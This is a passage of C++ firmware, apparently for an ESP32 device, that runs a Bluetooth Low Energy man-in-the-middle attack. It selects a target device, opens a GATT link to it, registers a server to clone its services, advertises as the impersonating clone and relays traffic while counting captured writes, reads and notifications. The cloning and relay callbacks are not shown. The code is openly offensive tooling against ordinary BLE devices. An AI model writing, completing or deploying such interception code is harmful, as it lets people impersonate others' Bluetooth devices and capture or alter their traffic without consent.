                ScannedDevice &dev = devices[selectedIdx];
                memcpy(targetAddr, dev.addr, 6);
                targetAddrType = dev.addrType;
                strncpy(targetName, dev.name, 23);
                targetName[23] = '\0';
                memcpy(targetAdvData, dev.advData, dev.advLen);
                targetAdvLen = dev.advLen;

                state = MITM_CONNECTING;
                stateEnterTime = millis();
                addLog("Target: %s", targetName[0] ? targetName : "unnamed");

                char addrStr[18];
                addrToStr(targetAddr, addrStr);
                addLog("Addr: %s", addrStr);
                addLog("Opening GATT link...");
                needsRedraw = true;

                Serial.printf("# TARGET: %s (%s)\n", targetName, addrStr);

                // Stop scanning and connect
                esp_ble_gap_stop_scanning();
                esp_ble_gattc_open(gattcIf, targetAddr, targetAddrType, true);
                delay(200);
            }
            // (Rescan on LEFT removed ,LEFT is framework-owned app-exit.)

            if (needsRedraw) {
                needsRedraw = false;
                drawSelectView();
            }
            break;
        }

        case MITM_CLONING: {
            // Register GATT server to build cloned services
            if (!gattsRegistered) {
                esp_ble_gatts_app_register(GATTS_APP_ID);
            } else {
                // Server callback will handle service creation
                // Once all services created, start advertising
                static unsigned long cloneStart = millis();
                if (millis() - cloneStart > 3000) {
                    // Timeout: start advertising with whatever we have
                    startAdvertising();
                }
            }

            // Spinner tick + force redraw so cloning doesn't look frozen.
            unsigned long now = millis();
            if (now - lastSpinnerTick > 150) {
                lastSpinnerTick = now;
                spinnerFrame = (spinnerFrame + 1) & 3;
                needsRedraw = true;
            }

            if (needsRedraw) {
                needsRedraw = false;
                drawStatusView();
            }
            break;
        }

        case MITM_CONNECTING:
        case MITM_ENUMERATING:
        case MITM_ADVERTISING:
        case MITM_RELAYING: {
            // Advance the spinner on a fixed 150 ms tick and force a redraw
            // so the long-running async states don't look frozen while BLE
            // works through connection/enumeration/advertising.
            unsigned long now = millis();
            if (state != MITM_RELAYING && now - lastSpinnerTick > 150) {
                lastSpinnerTick = now;
                spinnerFrame = (spinnerFrame + 1) & 3;
                needsRedraw = true;
            }

            if (needsRedraw) {
                needsRedraw = false;
                drawStatusView();
            }

            // Periodic redraw during relay for live traffic
            if (state == MITM_RELAYING) {
                static unsigned long lastRelayDraw = 0;
                if (millis() - lastRelayDraw > 500) {
                    lastRelayDraw = millis();
                    drawStatusView();
                }
            }
            break;
        }

        case MITM_ERROR: {
            // LEFT is framework-owned; pressing it will exit the app and
            // cleanupBleMitm() will handle teardown. No in-app rescan.
            if (needsRedraw) {
                needsRedraw = false;
                drawStatusView();
            }
            break;
        }
    }

    upPrev = upNow;
    downPrev = downNow;
    rightPrev = rightNow;
}

void cleanupBleMitm() {
    if (gattcConnected) {
        esp_ble_gattc_close(gattcIf, gattcConnId);
    }
    if (gattsConnected) {
        esp_ble_gatts_close(gattsIf, gattsConnId);
    }
    esp_ble_gap_stop_scanning();
    esp_ble_gap_stop_advertising();

    if (gattcRegistered) {
        esp_ble_gattc_app_unregister(gattcIf);
    }
    if (gattsRegistered) {
        esp_ble_gatts_app_unregister(gattsIf);
    }

    cleanupBLE();

    Serial.println();
    Serial.printf("# BLE MITM Session Summary\n");
    Serial.printf("# Writes captured: %d\n", writesCaptured);
    Serial.printf("# Reads captured: %d\n", readsCaptured);
    Serial.printf("# Notifications: %d\n", notifsCaptured);
    Serial.printf("# Total traffic: %d\n", trafficCount);
    Serial.println("# Session ended");
}
